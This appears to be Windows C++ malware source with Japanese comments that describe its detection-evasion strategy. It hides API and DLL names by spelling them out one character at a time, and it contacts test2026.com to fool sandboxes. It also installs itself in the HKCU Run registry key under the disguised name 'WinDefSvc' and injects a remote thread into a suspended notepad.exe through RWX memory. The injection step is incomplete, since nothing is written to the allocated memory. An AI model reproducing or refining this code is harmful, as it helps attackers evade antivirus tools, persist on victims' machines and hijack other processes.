#include <windows.h>
#include <wininet.h>

extern "C" NTSTATUS NtAllocateVirtualMemoryProc(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
extern "C" NTSTATUS NtWriteVirtualMemoryProc(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);

// 【新戦略】文字列を1文字ずつ隠蔽するマクロ
// これにより、バイナリ内に連続した文字列（"RegSet..."等）が一切存在しなくなります
#define HIDE_STR(name, ...) char name[] = { __VA_ARGS__, 0 };

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    
    // --- 1. ネットワーク通信（サンドボックスを釣る） ---
    // ライブラリ名もバラバラにして取得
    HIDE_STR(dNet, 'w','i','n','i','n','e','t','.','d','l','l');
    HMODULE hNet = LoadLibraryA(dNet);
    if (hNet) {
        HIDE_STR(fIO, 'I','n','t','e','r','n','e','t','O','p','e','n','A');
        HIDE_STR(fIOU, 'I','n','t','e','r','n','e','t','O','p','e','n','U','r','l','A');
        auto _IO = (HINTERNET(WINAPI*)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD))GetProcAddress(hNet, fIO);
        auto _IOU = (HINTERNET(WINAPI*)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR))GetProcAddress(hNet, fIOU);

        if (_IO && _IOU) {
            HINTERNET hS = _IO("Mozilla/5.0", 1, NULL, NULL, 0);
            if (hS) {
                // ドメイン名も分割して検知回避
                HIDE_STR(url, 'h','t','t','p',':','/','/','t','e','s','t','2','0','2','6','.','c','o','m');
                _IOU(hS, url, NULL, 0, 0x80000000, 0);
                InternetCloseHandle(hS);
            }
        }
    }

    // --- 2. 核心：レジストリとプロセス注入のAPIを隠す ---
    HIDE_STR(dAdv, 'a','d','v','a','p','i','3','2','.','d','l','l');
    HIDE_STR(fReg, 'R','e','g','S','e','t','V','a','l','u','e','E','x','A');
    auto _RegSet = (LSTATUS(WINAPI*)(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD))GetProcAddress(LoadLibraryA(dAdv), fReg);

    HIDE_STR(dKern, 'k','e','r','n','e','l','3','2','.','d','l','l');
    HIDE_STR(fCRT, 'C','r','e','a','t','e','R','e','m','o','t','e','T','h','r','e','a','d');
    auto _CRT = (HANDLE(WINAPI*)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))GetProcAddress(GetModuleHandleA(dKern), fCRT);

    // レジストリパスの動的組み立て
    HIDE_STR(rPath, 'S','o','f','t','w','a','r','e','\\','M','i','c','r','o','s','o','f','t','\\','W','i','n','d','o','w','s','\\','C','u','r','r','e','n','t','V','e','r','s','i','o','n','\\','R','u','n');
    
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, rPath, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        char p[MAX_PATH];
        GetModuleFileNameA(NULL, p, MAX_PATH);
        HIDE_STR(vName, 'W','i','n','D','e','f','S','v','c'); // 名前を無難なものに
        if (_RegSet) _RegSet(hKey, vName, 0, REG_SZ, (BYTE*)p, (DWORD)strlen(p));
        RegCloseKey(hKey);
    }

    // --- 3. プロセス注入 ---
    HIDE_STR(nPath, 'n','o','t','e','p','a','d','.','e','x','e');
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (CreateProcessA(NULL, nPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        PVOID base = NULL;
        SIZE_T size = 4096;
        NtAllocateVirtualMemoryProc(pi.hProcess, &base, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (_CRT) _CRT(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)base, NULL, 0, NULL);
        ResumeThread(pi.hThread);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    return 0;
}